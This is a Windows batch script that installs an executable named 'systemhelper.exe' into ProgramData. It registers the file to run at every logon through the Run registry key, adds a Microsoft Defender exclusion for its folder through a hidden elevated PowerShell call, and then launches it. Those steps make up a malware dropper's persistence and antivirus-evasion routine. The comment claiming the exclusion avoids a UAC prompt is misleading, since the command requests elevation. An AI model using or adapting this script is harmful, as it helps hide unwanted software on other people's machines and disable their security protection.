@echo off
REM Define source file and destination directory
set "source_file=systemhelper.exe"
set "destination_dir=C:\ProgramData\SystemHelper"

REM Create the destination directory if it doesn't exist
if not exist "%destination_dir%" (
    mkdir "%destination_dir%"
)

REM Copy the program to the destination directory
copy "%source_file%" "%destination_dir%\"

REM Add the program to the startup registry
set "reg_key=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "reg_name=SystemHelper"
set "reg_value=%destination_dir%\systemhelper.exe"
reg add "%reg_key%" /v "%reg_name%" /t REG_SZ /d "%reg_value%" /f

REM Eclude the destination folder from Microsoft Defender without UAC pop-up
PowerShell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath \"%destination_dir%\"' -Verb RunAs -WindowStyle Hidden"

REM Run the program
start "" "%reg_value%"

exit